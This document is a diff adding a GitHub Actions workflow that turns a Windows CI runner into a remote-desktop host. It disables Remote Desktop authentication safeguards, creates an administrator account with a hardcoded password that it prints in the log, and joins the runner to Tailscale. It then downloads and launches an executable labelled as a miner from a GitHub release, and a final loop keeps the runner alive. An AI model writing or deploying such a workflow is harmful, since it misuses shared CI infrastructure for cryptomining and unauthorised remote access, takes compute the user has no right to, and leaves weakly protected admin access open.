@@ -1,0 +1,124 @@
+ name: RDP
+
+on:
+  workflow_dispatch:
+
+jobs:
+  secure-rdp:
+    runs-on: windows-latest
+    timeout-minutes: 3600
+
+    steps:
+      # --- RDP & Tailscale Setup ---
+      - name: Configure Core RDP Settings
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
+          netsh advfirewall firewall delete rule name="RDP-Tailscale"
+          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
+          Restart-Service -Name TermService -Force
+
+      - name: Create RDP User with Fixed Password
+        run: |
+          $password = "Arone96778"
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          if (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue) {
+              Remove-LocalUser -Name "RDP"
+          }
+          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
+          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
+          if (-not (Get-LocalUser -Name "RDP")) {
+              Write-Error "User creation failed"
+              exit 1
+          }
+
+      - name: Install Tailscale
+        run: |
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $installerPath = "$env:TEMP\tailscale.msi"
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $installerPath -Force
+
+      - name: Establish Tailscale Connection
+        run: |
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          $tsIP = $null
+          $retries = 0
+          while (-not $tsIP -and $retries -lt 10) {
+              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 5
+              $retries++
+          }
+          if (-not $tsIP) {
+              Write-Error "Tailscale IP not assigned. Exiting."
+              exit 1
+          }
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+
+      - name: Verify RDP Accessibility
+        run: |
+          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
+          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
+          if (-not $testResult.TcpTestSucceeded) {
+              Write-Error "TCP connection to RDP port 3389 failed"
+              exit 1
+          }
+          Write-Host "TCP connectivity successful!"
+
+      # --- Install 7-Zip ---
+      - name: Install 7-Zip
+        run: |
+          $url = "https://www.7-zip.org/a/7z2301-x64.exe"
+          $installer = "$env:TEMP\7z2301-x64.exe"
+          Invoke-WebRequest -Uri $url -OutFile $installer
+          Start-Process -FilePath $installer -ArgumentList "/S" -Wait
+
+      # --- Download Miner from GitHub Release ---
+      - name: Download Miner from GitHub Release
+        run: |
+          $url = "https://github.com/frbrosss/RDP/releases/download/v.1/ok.exe"
+          $output = "$env:TEMP\ok.exe"
+          Invoke-WebRequest -Uri $url -OutFile $output
+          Write-Host "Miner downloaded to $output"
+
+      # --- Check Downloaded File (Hex dump for verification) ---
+      - name: Check Downloaded File
+        run: |
+          $file = "$env:TEMP\ok.exe"
+          Write-Host "Downloaded file size:"
+          Get-Item $file | Select-Object Length, FullName
+          Write-Host "First 64 bytes of file (as hex):"
+          $bytes = [System.IO.File]::ReadAllBytes($file)
+          $bytes[0..63] | ForEach-Object { Write-Host ("{0:X2}" -f $_) -NoNewline; Write-Host " " }
+          Write-Host ""
+
+      # --- Run Your Miner (only if file is OK) ---
+      - name: Run Your Miner
+        run: |
+          $miner = "$env:TEMP\ok.exe"
+          if ((Test-Path $miner) -and ((Get-Item $miner).Length -gt 10240)) {
+            Start-Process -FilePath $miner
+            Write-Host "Miner started!"
+          } else {
+            Write-Host "Miner not downloaded correctly!"
+            exit 1
+          }
+
+      # --- Maintain Connection (Graceful Stop for Shutdown) ---
+      - name: Maintain Connection (Graceful Stop)
+        run: |
+          Write-Host "`n=== RDP ACCESS ==="
+          Write-Host "Address: $env:TAILSCALE_IP"
+          Write-Host "Username: RDP"
+          Write-Host "Password: Arone96778"
+          Write-Host "==================`n"
+          Write-Host "To stop RDP, create the file 'C:\STOP-RDP.txt' in your RDP session."
+          while (!(Test-Path 'C:\STOP-RDP.txt')) {
+              Write-Host "[$(Get-Date)] RDP Active - Create C:\STOP-RDP.txt to end session."
+              Start-Sleep -Seconds 30
+          }
+          Write-Host "STOP-RDP.txt detected. Ending session."
